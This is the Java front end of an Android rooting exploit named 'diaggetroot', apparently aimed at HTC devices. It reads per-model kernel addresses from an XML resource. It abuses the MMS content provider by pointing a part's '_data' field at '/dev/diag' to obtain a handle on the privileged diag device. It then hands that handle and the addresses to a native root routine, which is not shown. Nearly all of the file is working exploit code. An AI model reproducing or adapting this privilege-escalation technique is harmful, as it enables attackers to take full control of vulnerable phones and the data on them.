/*
 * Copyright (c) 2013 Hiroyuki Ikezoe
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR(S) ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR(S) BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
/*
 * Based on htcj_butterflay_diaggetroot.zip
 * <https://docs.google.com/file/d/0B8LDObFOpzZqQzducmxjRExXNnM/edit?pli=1>
 */
package com.example.diaggetroot;

import java.io.IOException;
import java.io.FileDescriptor;
import java.lang.reflect.Field;
import android.content.res.Resources;
import android.content.res.XmlResourceParser;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.app.Activity;
import android.content.ContentValues;
import android.widget.TextView;
import android.view.View;
import android.util.AttributeSet;
import android.util.Log;
import android.util.Xml;
import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserException;

public class MainActivity extends Activity {
  final static String TAG = "##DiagGetroot##";

  private class InjectionAddresses {
    public int mUeventHelper;
    public int mDelayedRspId;

    InjectionAddresses(int ueventHelper,
                     int delayedRspId) {
      mUeventHelper = ueventHelper;
      mDelayedRspId = delayedRspId;
    }
  };

  static {
    System.loadLibrary("diaggetrootjni");
  }
  native boolean getrootnative(int fd,
                               int uevent_helper_address,
                               int delayed_rsp_id_address);

  private InjectionAddresses findInjectionAddresses() {
    XmlResourceParser parser = getResources().getXml(R.xml.supported_devices);

    int eventType;
    try {
      eventType = parser.getEventType();
      String tagName;
      String deviceName = null;
      do {
        if (eventType == XmlPullParser.START_TAG) {
          tagName = parser.getName();
          if (tagName.equals("device")) {
            deviceName = parser.getAttributeValue(null, "name");
          } else if (Build.MODEL.equals(deviceName) &&
                     tagName.equals("build")) {
            String id = parser.getAttributeValue(null, "id");
            if (Build.DISPLAY.equals(id)) {
              int ueventHelper = parser.getAttributeUnsignedIntValue(null, "uevent_helper", 0);
              int delayedRspId = parser.getAttributeUnsignedIntValue(null, "delayed_rsp_id", 0);
              if (ueventHelper != 0 && delayedRspId != 0) {
                return new InjectionAddresses(ueventHelper, delayedRspId);
              }
            }
          }
        }
        eventType = parser.next();
      } while (eventType != XmlPullParser.END_DOCUMENT);
    } catch (XmlPullParserException e) {
      throw new RuntimeException("I died", e);
    } catch (IOException e) {
      throw new RuntimeException("I died", e);
    }

    return null;
  }

  private boolean useMMS(InjectionAddresses addresses) {
    Uri uri = Uri.parse("content://mms/0/part");
    try {
      ContentValues values2 = new ContentValues();
      Uri uri2 = getContentResolver().insert(uri, values2);
      if (uri2 != null)
        Log.d(TAG, "" + uri2);
      ContentValues values = new ContentValues();
      values.put("_data", "/dev/diag");
      getContentResolver().update(uri2, values, null, null);
      ParcelFileDescriptor pfd = getContentResolver().openFileDescriptor(uri2, "rw");
      Log.d(TAG, "Pfd=" + pfd);
      pfd.getFileDescriptor();
      FileDescriptor fd = pfd.getFileDescriptor();
      Field fld = fd.getClass().getDeclaredField("descriptor");
      fld.setAccessible(true);
      int fint;
      fint = fld.getInt(fd);
      Log.d(TAG, "fint=" + fint);
      return getrootnative(fint,
                           addresses.mUeventHelper,
                           addresses.mDelayedRspId);
    } catch (Exception e) {
      e.printStackTrace();
    }
    return false;
  }

  @Override
  public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    TextView view = (TextView)this.findViewById(R.id.text);
    InjectionAddresses addresses = findInjectionAddresses();
    if (addresses == null) {
      Log.d(TAG, "Unsupported model = " + Build.MODEL + " display_id = " + Build.DISPLAY);
      view.setText(getString(R.string.unsupported_message));
    } else {
      Log.d(TAG, "\tuevent_helper = " + String.format("0x%x", addresses.mUeventHelper));
      Log.d(TAG, "\tdelayed_rsp_id = " + String.format("0x%x", addresses.mDelayedRspId));
      if (useMMS(addresses)) {
        view.setText(getString(R.string.success_message));
      }
    }
  }
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
